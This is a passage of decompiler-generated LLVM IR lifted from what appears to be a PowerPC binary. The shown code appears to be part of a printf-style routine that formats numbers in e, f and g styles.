dec_label_pc_1000a3c4:                            ; preds = %dec_label_pc_1000a3c4.dec_label_pc_1000a3c4_crit_edge, %dec_label_pc_1000a398
  %v1_1000a3cc = phi i32 [ %v1_1000a3cc.pre, %dec_label_pc_1000a3c4.dec_label_pc_1000a3c4_crit_edge ], [ %v1_1000a3a8, %dec_label_pc_1000a398 ]
  %v0_1000a3c8 = phi i32 [ %v0_1000a3c8.pre, %dec_label_pc_1000a3c4.dec_label_pc_1000a3c4_crit_edge ], [ 0, %dec_label_pc_1000a398 ]
  %v1_1000a3c4 = phi i32 [ %v1_1000a3c4.pre, %dec_label_pc_1000a3c4.dec_label_pc_1000a3c4_crit_edge ], [ 10, %dec_label_pc_1000a398 ]
  %v1_1000a3d4 = phi i32 [ %v0_1000a3c4.pre, %dec_label_pc_1000a3c4.dec_label_pc_1000a3c4_crit_edge ], [ %storemerge2, %dec_label_pc_1000a398 ]
  %v2_1000a3c4 = udiv i32 %v1_1000a3d4, %v1_1000a3c4
  store i32 %v2_1000a3c4, i32* %r0.global-to-local, align 4
  %v1_1000a3c8 = add i32 %v0_1000a3c8, 1
  store i32 %v1_1000a3c8, i32* %r8.global-to-local, align 4
  %v2_1000a3cc = sub i32 %v1_1000a3cc, %v1_1000a3c8
  store i32 %v2_1000a3cc, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_1000a3c4, -10
  store i32 %v2_1000a3c4, i32* %r10.global-to-local, align 4
  %v2_1000a3d4 = add i32 %v1_1000a3d4, 48
  %v1_1000a3dc = add i32 %v2_1000a3d4, %tmp76
  store i32 %v1_1000a3dc, i32* %r9.global-to-local, align 4
  %v1_1000a3e0 = trunc i32 %v1_1000a3dc to i8
  %v3_1000a3e0 = inttoptr i32 %v2_1000a3cc to i8*
  store i8 %v1_1000a3e0, i8* %v3_1000a3e0, align 1
  %v0_1000a3e4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a3e4 = add i32 %v0_1000a3e4, -1
  store i32 %v1_1000a3e4, i32* %ctr.global-to-local, align 4
  %v2_1000a3e4 = icmp eq i32 %v1_1000a3e4, 0
  br i1 %v2_1000a3e4, label %dec_label_pc_1000a3e8, label %dec_label_pc_1000a3c4.dec_label_pc_1000a3c4_crit_edge

dec_label_pc_1000a3c4.dec_label_pc_1000a3c4_crit_edge: ; preds = %dec_label_pc_1000a3c4
  %v0_1000a3c4.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a3c4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000a3c8.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a3cc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000a3c4

dec_label_pc_1000a3e8:                            ; preds = %dec_label_pc_1000a3c4
  %v0_1000a3e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a3e8 = icmp slt i32 %v0_1000a3e8, 0
  %v3_1000a3e8 = icmp eq i32 %v0_1000a3e8, 0
  store i1 %v1_1000a3e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a3e8, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a3ec = add i32 %v0_1000a3e8, 1
  store i32 %v1_1000a3ec, i32* %r7.global-to-local, align 4
  br i1 %v3_1000a3e8, label %dec_label_pc_1000a3e8.dec_label_pc_1000a368_crit_edge, label %dec_label_pc_1000a3f4

dec_label_pc_1000a3e8.dec_label_pc_1000a368_crit_edge: ; preds = %dec_label_pc_1000a3e8
  %v0_1000a36c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a368

dec_label_pc_1000a3f4:                            ; preds = %dec_label_pc_1000a3e8
  %v0_1000a3f4 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a3f4 = icmp ult i32 %v0_1000a3f4, 96
  %v2_1000a3f4 = icmp ugt i32 %v0_1000a3f4, 96
  %v3_1000a3f4 = icmp eq i32 %v0_1000a3f4, 96
  store i1 %v1_1000a3f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a3f4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000a3f4, label %dec_label_pc_1000a40c, label %dec_label_pc_1000a3fc

dec_label_pc_1000a3fc:                            ; preds = %dec_label_pc_1000a3f4
  %v1_1000a404 = add i32 %v0_1000a3f4, 32
  store i32 %v1_1000a404, i32* %r0.global-to-local, align 4
  %v1_1000a408 = urem i32 %v1_1000a404, 256
  store i32 %v1_1000a408, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a40c

dec_label_pc_1000a40c:                            ; preds = %dec_label_pc_1000a3f4, %dec_label_pc_1000a3fc
  %v0_1000a424 = phi i32 [ %v1_1000a408, %dec_label_pc_1000a3fc ], [ %v0_1000a3f4, %dec_label_pc_1000a3f4 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_1000a3fc ], [ 101, %dec_label_pc_1000a3f4 ]
  %v1_1000a40c = icmp slt i32 %v0_1000a424, 103
  %v3_1000a40c = icmp eq i32 %v0_1000a424, 103
  store i1 %v1_1000a40c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a40c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a40c, label %dec_label_pc_1000a414, label %dec_label_pc_1000a424

dec_label_pc_1000a414:                            ; preds = %dec_label_pc_1000a40c
  %v0_1000a414 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000a414 = icmp slt i32 %v0_1000a414, 0
  %v3_1000a414 = icmp eq i32 %v0_1000a414, 0
  store i1 %v1_1000a414, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a414, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a414, label %dec_label_pc_1000a42c, label %dec_label_pc_1000a41c

dec_label_pc_1000a41c:                            ; preds = %dec_label_pc_1000a414
  %v1_1000a41c = add i32 %v0_1000a414, -1
  store i32 %v1_1000a41c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a42c

dec_label_pc_1000a424:                            ; preds = %dec_label_pc_1000a40c
  %v1_1000a424 = icmp slt i32 %v0_1000a424, 102
  %v3_1000a424 = icmp eq i32 %v0_1000a424, 102
  store i1 %v1_1000a424, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a424, i1* %cr7_eq.global-to-local, align 1
  %v0_1000a434 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_1000a424, label %dec_label_pc_1000a434, label %dec_label_pc_1000a42c

dec_label_pc_1000a42c:                            ; preds = %dec_label_pc_1000a424, %dec_label_pc_1000a414, %dec_label_pc_1000a41c
  %v0_1000a42c = phi i32 [ 0, %dec_label_pc_1000a414 ], [ %v1_1000a41c, %dec_label_pc_1000a41c ], [ %v0_1000a434, %dec_label_pc_1000a424 ]
  store i32 %v0_1000a42c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a458

dec_label_pc_1000a434:                            ; preds = %dec_label_pc_1000a424
  %v1_1000a434 = load i32, i32* %r4.global-to-local, align 4
  %v2_1000a434 = add i32 %v1_1000a434, %v0_1000a434
  store i32 %v2_1000a434, i32* %r10.global-to-local, align 4
  %v1_1000a438 = icmp slt i32 %v2_1000a434, -1
  %v3_1000a438 = icmp eq i32 %v2_1000a434, -1
  store i1 %v1_1000a438, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a438, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_1000a434, -2
  br i1 %tmp77, label %dec_label_pc_1000a458, label %dec_label_pc_1000a440

dec_label_pc_1000a440:                            ; preds = %dec_label_pc_1000a434
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_1000a444 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_1000a444, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268477520, i32* @lr, align 4
  %v3_1000a44c = call i32 @function_100071a4(i32 %v2_1000a444, i32 48, i32 17)
  store i32 %v3_1000a44c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a458

dec_label_pc_1000a458:                            ; preds = %dec_label_pc_1000a434, %dec_label_pc_1000a42c, %dec_label_pc_1000a440
  %v1_1000a47c = phi i32 [ %v2_1000a434, %dec_label_pc_1000a434 ], [ %v0_1000a42c, %dec_label_pc_1000a42c ], [ -1, %dec_label_pc_1000a440 ]
  %v1_1000a458 = icmp slt i32 %v1_1000a47c, 16
  %v2_1000a458 = icmp sgt i32 %v1_1000a47c, 16
  %v3_1000a458 = icmp eq i32 %v1_1000a47c, 16
  store i1 %v1_1000a458, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a458, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_1000a46c = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_1000a46c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_1000a458, label %dec_label_pc_1000a494, label %dec_label_pc_1000a478

dec_label_pc_1000a478:                            ; preds = %dec_label_pc_1000a458
  %v2_1000a478 = ptrtoint i32* %stack_var_-177 to i32
  %v2_1000a47c = add i32 %v1_1000a47c, %v2_1000a478
  store i32 %v2_1000a47c, i32* %r9.global-to-local, align 4
  %v1_1000a480 = add i32 %v2_1000a47c, 2
  %v2_1000a480 = inttoptr i32 %v1_1000a480 to i8*
  %v3_1000a480 = load i8, i8* %v2_1000a480, align 1
  %v4_1000a480 = zext i8 %v3_1000a480 to i32
  store i32 %v4_1000a480, i32* %r0.global-to-local, align 4
  store i32 %v1_1000a480, i32* %r11.global-to-local, align 4
  %v1_1000a488 = sub nsw i32 52, %v4_1000a480
  %v2_1000a488 = sub nuw nsw i32 -1, %v4_1000a480
  %not.v5_1000a488 = icmp ugt i32 %v1_1000a488, %v2_1000a488
  %v1_1000a490 = zext i1 %not.v5_1000a488 to i32
  store i32 %v1_1000a490, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a494

dec_label_pc_1000a494:                            ; preds = %dec_label_pc_1000a458, %dec_label_pc_1000a478, %dec_label_pc_1000a494.backedge
  %v0_1000a498 = phi i32 [ %v0_1000a498.pre, %dec_label_pc_1000a494.backedge ], [ 0, %dec_label_pc_1000a458 ], [ %v1_1000a490, %dec_label_pc_1000a478 ]
  %v0_1000a494 = phi i32 [ %v0_1000a494.pre, %dec_label_pc_1000a494.backedge ], [ %v2_1000a46c, %dec_label_pc_1000a458 ], [ %v1_1000a480, %dec_label_pc_1000a478 ]
  %v1_1000a494 = add i32 %v0_1000a494, -1
  %v2_1000a494 = inttoptr i32 %v1_1000a494 to i8*
  %v3_1000a494 = load i8, i8* %v2_1000a494, align 1
  %v4_1000a494 = zext i8 %v3_1000a494 to i32
  store i32 %v1_1000a494, i32* %r11.global-to-local, align 4
  %v2_1000a498 = add i32 %v4_1000a494, %v0_1000a498
  store i32 %v2_1000a498, i32* %r0.global-to-local, align 4
  %v1_1000a49c = urem i32 %v2_1000a498, 256
  store i32 %v1_1000a49c, i32* %r9.global-to-local, align 4
  %v1_1000a4a0 = trunc i32 %v2_1000a498 to i8
  store i8 %v1_1000a4a0, i8* %v2_1000a494, align 1
  %v0_1000a4a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4a4 = icmp slt i32 %v0_1000a4a4, 48
  %v3_1000a4a4 = icmp eq i32 %v0_1000a4a4, 48
  store i1 %v1_1000a4a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a4a4, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a4a8 = icmp ult i32 %v0_1000a4a4, 57
  %v2_1000a4a8 = icmp ugt i32 %v0_1000a4a4, 57
  %v3_1000a4a8 = icmp eq i32 %v0_1000a4a4, 57
  store i1 %v1_1000a4a8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000a4a8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000a4a8, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000a4a4, %v2_1000a4a8
  br i1 %brmerge, label %dec_label_pc_1000a494.backedge, label %dec_label_pc_1000a4b4

dec_label_pc_1000a494.backedge:                   ; preds = %dec_label_pc_1000a494
  %v0_1000a494.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000a498.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a494

dec_label_pc_1000a4b4:                            ; preds = %dec_label_pc_1000a494
  %v2_1000a4b4 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_1000a4b4, i32* %r0.global-to-local, align 4
  %v0_1000a4b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1000a4b8, i32* %r7.global-to-local, align 4
  %v0_1000a4bc = load i32, i32* %r11.global-to-local, align 4
  %v2_1000a4bc = icmp ult i32 %v0_1000a4bc, %v2_1000a4b4
  %v3_1000a4bc = icmp ugt i32 %v0_1000a4bc, %v2_1000a4b4
  %v4_1000a4bc = icmp eq i32 %v0_1000a4bc, %v2_1000a4b4
  store i1 %v2_1000a4bc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a4bc, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_1000a348, i32* %r8.global-to-local, align 4
  br i1 %v3_1000a4bc, label %dec_label_pc_1000a4d4, label %dec_label_pc_1000a4c8

dec_label_pc_1000a4c8:                            ; preds = %dec_label_pc_1000a4b4
  store i32 %v2_1000a4b4, i32* %r8.global-to-local, align 4
  %v1_1000a4cc = add i32 %v0_1000a4b8, 1
  store i32 %v1_1000a4cc, i32* %r7.global-to-local, align 4
  store i32 %v2_1000a4b4, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a4d4

dec_label_pc_1000a4d4:                            ; preds = %dec_label_pc_1000a4b4, %dec_label_pc_1000a4c8
  %v2_1000a4dc = phi i32 [ %v0_1000a4bc, %dec_label_pc_1000a4b4 ], [ %v2_1000a4b4, %dec_label_pc_1000a4c8 ]
  %v0_1000a4d4 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a4d4 = icmp slt i32 %v0_1000a4d4, 103
  %v3_1000a4d4 = icmp eq i32 %v0_1000a4d4, 103
  store i1 %v1_1000a4d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a4d4, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000a4dc = add i32 %v2_1000a4dc, 1
  %v4_1000a4dc = inttoptr i32 %v3_1000a4dc to i8*
  store i8 0, i8* %v4_1000a4dc, align 1
  %v0_1000a4e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a4e0 = add i32 %v0_1000a4e0, 1
  store i32 %v1_1000a4e0, i32* %r9.global-to-local, align 4
  %v0_1000a4e4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a4e4, label %dec_label_pc_1000a4e8, label %dec_label_pc_1000a50c

dec_label_pc_1000a4e8:                            ; preds = %dec_label_pc_1000a4d4
  %v0_1000a4e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a4e8 = icmp slt i32 %v0_1000a4e8, -4
  %v3_1000a4e8 = icmp eq i32 %v0_1000a4e8, -4
  store i1 %v1_1000a4e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a4e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1000a4e8, label %dec_label_pc_1000a504, label %dec_label_pc_1000a4f0

dec_label_pc_1000a4f0:                            ; preds = %dec_label_pc_1000a4e8
  %v1_1000a4f0 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a4f0 = icmp sgt i32 %v1_1000a4f0, %v0_1000a4e8
  %v3_1000a4f0 = icmp slt i32 %v1_1000a4f0, %v0_1000a4e8
  %v4_1000a4f0 = icmp eq i32 %v1_1000a4f0, %v0_1000a4e8
  store i1 %v2_1000a4f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a4f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a4f0, label %dec_label_pc_1000a504, label %dec_label_pc_1000a4f8

dec_label_pc_1000a4f8:                            ; preds = %dec_label_pc_1000a4f0
  %v2_1000a4f8 = sub i32 %v1_1000a4f0, %v0_1000a4e8
  store i32 %v2_1000a4f8, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a524

dec_label_pc_1000a504:                            ; preds = %dec_label_pc_1000a4f0, %dec_label_pc_1000a4e8
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a518

dec_label_pc_1000a50c:                            ; preds = %dec_label_pc_1000a4d4
  %v0_1000a50c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a50c = icmp slt i32 %v0_1000a50c, 102
  %v3_1000a50c = icmp eq i32 %v0_1000a50c, 102
  store i1 %v1_1000a50c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a50c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1000a50c, i32* %r4.global-to-local, align 4
  br i1 %v3_1000a50c, label %dec_label_pc_1000a524thread-pre-split, label %dec_label_pc_1000a518

dec_label_pc_1000a518:                            ; preds = %dec_label_pc_1000a50c, %dec_label_pc_1000a504
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_1000a538

dec_label_pc_1000a524thread-pre-split:            ; preds = %dec_label_pc_1000a50c
  %v0_1000a524.pr = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000a524

dec_label_pc_1000a524:                            ; preds = %dec_label_pc_1000a524thread-pre-split, %dec_label_pc_1000a4f8
  %v0_1000a528 = phi i32 [ %v0_1000a524.pr, %dec_label_pc_1000a524thread-pre-split ], [ %v0_1000a4e8, %dec_label_pc_1000a4f8 ]
  %v1_1000a524 = icmp slt i32 %v0_1000a528, 0
  %v2_1000a524 = icmp sgt i32 %v0_1000a528, 0
  %v3_1000a524 = icmp eq i32 %v0_1000a528, 0
  store i1 %v1_1000a524, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000a524, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000a524, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_1000a528, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_1000a528, -1
  br i1 %tmp78, label %dec_label_pc_1000a538, label %dec_label_pc_1000a530

dec_label_pc_1000a530:                            ; preds = %dec_label_pc_1000a524
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_1000a534 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000a534 = add i32 %v2_1000a534, -1
  %v4_1000a534 = inttoptr i32 %v3_1000a534 to i8*
  store i8 48, i8* %v4_1000a534, align 1
  store i32 %v3_1000a534, i32* %r8.global-to-local, align 4
  %v1_1000a554.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000a568.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_1000a538

dec_label_pc_1000a538:                            ; preds = %dec_label_pc_1000a524, %dec_label_pc_1000a518, %dec_label_pc_1000a530
  %v0_1000a568 = phi i1 [ %v1_1000a524, %dec_label_pc_1000a524 ], [ false, %dec_label_pc_1000a518 ], [ %v0_1000a568.pre, %dec_label_pc_1000a530 ]
  %v1_1000a554 = phi i32 [ %v1_1000a4e0, %dec_label_pc_1000a524 ], [ %v1_1000a4e0, %dec_label_pc_1000a518 ], [ %v1_1000a554.pre, %dec_label_pc_1000a530 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_1000a544 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_1000a544, i32* %r0.global-to-local, align 4
  %v0_1000a54c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a54c = add i32 %v0_1000a54c, 1
  store i32 %v1_1000a54c, i32* %r6.global-to-local, align 4
  %v2_1000a554 = sub i32 %v1_1000a554, %v1_1000a54c
  store i32 %v2_1000a554, i32* %r11.global-to-local, align 4
  %v1_1000a558 = inttoptr i32 %v0_1000a54c to i8*
  %v2_1000a558 = load i8, i8* %v1_1000a558, align 1
  %v3_1000a558 = zext i8 %v2_1000a558 to i32
  store i32 %v3_1000a558, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_1000a568, label %dec_label_pc_1000a5c8, label %dec_label_pc_1000a56c

dec_label_pc_1000a56c:                            ; preds = %dec_label_pc_1000a538
  %v0_1000a56c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a56c = icmp slt i32 %v0_1000a56c, %v2_1000a554
  %v4_1000a56c = icmp eq i32 %v0_1000a56c, %v2_1000a554
  store i1 %v2_1000a56c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a56c, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_1000a56c, label %dec_label_pc_1000a5c0, label %dec_label_pc_1000a580

dec_label_pc_1000a580:                            ; preds = %dec_label_pc_1000a56c
  %v2_1000a580 = sub i32 %v0_1000a56c, %v2_1000a554
  store i32 %v2_1000a580, i32* %r0.global-to-local, align 4
  %v4_1000a580 = icmp sgt i32 %v2_1000a580, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000a580, label %dec_label_pc_1000a59c, label %dec_label_pc_1000a58c

dec_label_pc_1000a58c:                            ; preds = %dec_label_pc_1000a580
  %v2_1000a590 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000a590, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a5e4

dec_label_pc_1000a59c:                            ; preds = %dec_label_pc_1000a580
  store i32 ptrtoint (i32* @global_var_1000f83b.303 to i32), i32* %r9.global-to-local, align 4
  %v2_1000a5a8 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1000a5a8, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1000a5e4

dec_label_pc_1000a5c0:                            ; preds = %dec_label_pc_1000a56c
  %v0_1000a5c0 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000a5c0, label %dec_label_pc_1000a5d0, label %dec_label_pc_1000a5c4

dec_label_pc_1000a5c4:                            ; preds = %dec_label_pc_1000a5c0
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a5c8

dec_label_pc_1000a5c8:                            ; preds = %dec_label_pc_1000a538, %dec_label_pc_1000a5c4
  %v2_1000a5c8 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000a5c8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a5e4

dec_label_pc_1000a5d0:                            ; preds = %dec_label_pc_1000a5c0
  %v2_1000a5d0 = sub i32 %v2_1000a554, %v0_1000a56c
  store i32 %v2_1000a5d0, i32* %r11.global-to-local, align 4
  %v2_1000a5d8 = add i32 %v0_1000a56c, %v1_1000a54c
  store i32 %v2_1000a5d8, i32* %r6.global-to-local, align 4
  %v2_1000a5dc = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000a5dc, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a5e4

dec_label_pc_1000a5e4:                            ; preds = %dec_label_pc_1000a5c8, %dec_label_pc_1000a59c, %dec_label_pc_1000a58c, %dec_label_pc_1000a5d0
  %v1_1000a610 = phi i32 [ %v2_1000a5c8, %dec_label_pc_1000a5c8 ], [ %v2_1000a5a8, %dec_label_pc_1000a59c ], [ %v2_1000a590, %dec_label_pc_1000a58c ], [ %v2_1000a5dc, %dec_label_pc_1000a5d0 ]
  %v0_1000a5f0 = phi i32 [ %v2_1000a554, %dec_label_pc_1000a5c8 ], [ 0, %dec_label_pc_1000a59c ], [ 0, %dec_label_pc_1000a58c ], [ %v2_1000a5d0, %dec_label_pc_1000a5d0 ]
  %v3_1000a5e4 = load i32, i32* %v2_1000a1b4, align 4
  store i32 %v3_1000a5e4, i32* %r0.global-to-local, align 4
  %v1_1000a5e8 = and i32 %v3_1000a5e4, 16
  store i32 %v1_1000a5e8, i32* %r9.global-to-local, align 4
  %v3_1000a5e8 = icmp eq i32 %v1_1000a5e8, 0
  br i1 %v3_1000a5e8, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a608

dec_label_pc_1000a5f0:                            ; preds = %dec_label_pc_1000a5e4
  %v1_1000a5f0 = icmp slt i32 %v0_1000a5f0, 0
  %v3_1000a5f0 = icmp eq i32 %v0_1000a5f0, 0
  store i1 %v1_1000a5f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a5f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a5f0, label %dec_label_pc_1000a5f8, label %dec_label_pc_1000a608

dec_label_pc_1000a5f8:                            ; preds = %dec_label_pc_1000a5f0
  %v0_1000a5f8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a5f8 = icmp slt i32 %v0_1000a5f8, 103
  %v3_1000a5f8 = icmp eq i32 %v0_1000a5f8, 103
  store i1 %v1_1000a5f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a5f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a5f8, label %dec_label_pc_1000a628, label %dec_label_pc_1000a600

dec_label_pc_1000a600:                            ; preds = %dec_label_pc_1000a5f8
  %v0_1000a600 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000a600 = icmp slt i32 %v0_1000a600, 0
  %v3_1000a600 = icmp eq i32 %v0_1000a600, 0
  store i1 %v1_1000a600, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a600, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_1000a600, 1
  br i1 %tmp79, label %dec_label_pc_1000a628, label %dec_label_pc_1000a608

dec_label_pc_1000a608:                            ; preds = %dec_label_pc_1000a5f0, %dec_label_pc_1000a5e4, %dec_label_pc_1000a600
  %v2_1000a610 = inttoptr i32 %v1_1000a610 to i32*
  store i32 112, i32* %v2_1000a610, align 4
  store i32 ptrtoint (i32* @global_var_1000f848.304 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000a61c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a61c = add i32 %v1_1000a61c, 8
  %v3_1000a61c = inttoptr i32 %v2_1000a61c to i32*
  store i32 ptrtoint (i32* @global_var_1000f848.304 to i32), i32* %v3_1000a61c, align 4
  %v0_1000a620 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a620 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a620 = add i32 %v1_1000a620, 4
  %v3_1000a620 = inttoptr i32 %v2_1000a620 to i32*
  store i32 %v0_1000a620, i32* %v3_1000a620, align 4
  %v0_1000a624 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a624 = add i32 %v0_1000a624, 12
  store i32 %v1_1000a624, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a628

dec_label_pc_1000a628:                            ; preds = %dec_label_pc_1000a600, %dec_label_pc_1000a5f8, %dec_label_pc_1000a608
  %v1_1000a638 = phi i32 [ %v1_1000a610, %dec_label_pc_1000a600 ], [ %v1_1000a610, %dec_label_pc_1000a5f8 ], [ %v1_1000a624, %dec_label_pc_1000a608 ]
  %v0_1000a628 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a628 = add i32 %v0_1000a628, 1
  store i32 %v1_1000a628, i32* %r10.global-to-local, align 4
  %v4_1000a628 = icmp eq i32 %v1_1000a628, 0
  br i1 %v4_1000a628, label %dec_label_pc_1000a650, label %dec_label_pc_1000a630

dec_label_pc_1000a630:                            ; preds = %dec_label_pc_1000a628
  %v1_1000a630 = sub i32 -1, %v0_1000a628
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000a638 = add i32 %v1_1000a638, 4
  %v3_1000a638 = inttoptr i32 %v2_1000a638 to i32*
  store i32 %v1_1000a630, i32* %v3_1000a638, align 4
  store i32 ptrtoint (i32* @global_var_1000f83b.303 to i32), i32* %r9.global-to-local, align 4
  %v0_1000a644 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a644 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a644 = inttoptr i32 %v1_1000a644 to i32*
  store i32 %v0_1000a644, i32* %v2_1000a644, align 4
  %v0_1000a648 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a648 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a648 = add i32 %v1_1000a648, 8
  %v3_1000a648 = inttoptr i32 %v2_1000a648 to i32*
  store i32 %v0_1000a648, i32* %v3_1000a648, align 4
  %v0_1000a64c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a64c = add i32 %v0_1000a64c, 12
  store i32 %v1_1000a64c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a650

dec_label_pc_1000a650:                            ; preds = %dec_label_pc_1000a628, %dec_label_pc_1000a630
  %v1_1000a65c = phi i32 [ %v1_1000a638, %dec_label_pc_1000a628 ], [ %v1_1000a64c, %dec_label_pc_1000a630 ]
  %v0_1000a650 = load i32, i32* %r11.global-to-local, align 4
